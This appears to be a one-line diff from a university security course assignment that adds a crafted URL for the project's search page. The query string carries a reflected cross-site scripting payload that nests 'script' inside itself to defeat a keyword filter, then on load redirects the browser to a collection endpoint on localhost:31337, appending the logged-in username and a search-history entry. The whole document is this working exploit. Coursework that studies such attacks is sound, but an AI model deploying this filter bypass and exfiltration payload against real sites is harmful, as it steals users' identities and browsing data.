@@ -1,0 +1,1 @@
+https://eecs388.org/project2/search?xssdefense=2&q=<scrscriptipt>window.onload=function(){window.location='https://localhost:31337/stolen?user='%2Bdocument.getElementById('logged-in-user').innerHTML%2B'?last_search='%2BString(document.getElementsByClassName("history-item list-group-item")[1]).substring(38)}</scrscriptipt>
